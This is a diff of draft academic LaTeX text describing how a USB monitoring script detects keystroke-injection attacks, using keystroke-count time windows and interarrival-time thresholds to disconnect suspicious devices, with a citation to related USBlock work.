-The other option is to look at the time interarrival time, which is the time that elapses between keystrokes. Options here the interarrival time t set as suspicious threshold and the number of keystrokes n it is averaged over. Similarly to the time window approach, all entries in the queue are first checked for their relevance, on the the n latest keystrokes should remain in the queue. Then the elapsed time is calculated by subtracting the first relevant timestampt from the last relevant timestamp. Finally this value is divided by n to get the average over the desired number of keystrokes a value which is checked against the minimum interarrival time set by the user. If the input is faster than expected the device is disconnected by calling the \verb|disable_device()| method. 
+First, we will look at the number of keystrokes over time. The two variable factors for this are the number of keypresses 'n' that will define the threshold and the time 's' over which they are measured. 
+Upon the arrival of a Frame that was identified as a keystroke and passed all the previously mentioned filters, a timestamp is recorded. This timestamp is then added to a queue attribute on the USBDevice class, called \verb|registered_keypresses|. Next, the script iterates through the timestamps in that queue and removes all the keypresses that happened before the considered time window: if timestamp < current time - time window t it is removed from the queue. If the length of the queue is above the threshold for keystrokes n after all the entries have been checked for relevance, then more than the allowed number of keystrokes were recorded within the time window and the rate limit is exceeded. The \verb|disable_device()| method is called to disconnect the device and make sure the suspected attack is interrupted. The effectiveness of different values for n and s will be discussed in section TODO. 
 
 
-(A similar implementation was done by \cite{neunerUSBlockBlockingUSBBased2018} who described a detection mechanism for what they call Rapid Keypress event sequence (RES). A RES would be detected every time a sequence s of consecutive keypresses that arrive with an interarrival time less than a defined threshold between each of them. They concluded that t should be at 0.02 with an s of 3 to allow some averaging while ruling out false negatives for short attacks. TODO maybe put this into eval? )
+The other option is to look at the time interarrival time, which is the time that elapses between keystrokes. The user can set a suspicious threshold by choosing the interarrival time tt and the number of keystrokes n to average over. Similarly to the time window approach, all entries in the queue are first checked for their relevance, on the the n latest keystrokes should remain in the queue. Then the elapsed time is calculated by subtracting the first relevant timestamp from the last relevant timestamp. Finally, this value is divided by n to get the average over the desired number of keystrokes a value which is checked against the minimum interarrival time set by the user. If the input is faster than expected the device is disconnected by calling the \verb|disable_device()| method. 
+
+
+(A similar implementation was done by \cite{neunerUSBlockBlockingUSBBased2018} who described a detection mechanism for what they call Rapid Keypress event sequence (RES). A RES would be detected every time a sequence s of consecutive keypresses arrive with an interarrival time less than a defined threshold between each of them. They concluded that t should be at 0.02 with an s of 3 to allow some averaging while ruling out false negatives for short attacks. TODO maybe put this into eval? )
 
 
 
